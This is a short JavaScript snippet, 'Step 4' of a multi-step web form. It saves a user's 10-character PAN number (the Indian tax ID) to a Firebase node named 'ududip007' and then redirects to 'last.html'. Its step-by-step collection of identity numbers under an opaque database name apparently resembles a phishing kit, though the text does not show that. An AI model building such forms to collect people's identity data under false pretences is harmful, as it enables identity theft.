// Step 4: Save PAN Number in existing ududip007 entry

var firebaseKey = localStorage.getItem("firebaseKey");

if (!firebaseKey) {
  alert("Please complete Step 1 first.");
  window.location.href = "index.html";
}

var userRef = firebase.database().ref("ududip007/" + firebaseKey);

// Submit handler
document.getElementById("ududip007").addEventListener("submit", function (e) {
  e.preventDefault();

  var pan = document.getElementById("pan").value.trim();

  if (pan.length !== 10) {
    alert("Please enter a valid 10-character PAN number.");
    return;
  }

  userRef.update({
    g_pan: pan
  }).then(() => {
    window.location.href = "last.html";
  }).catch((error) => {
    alert("Error: " + error.message);
  });
});
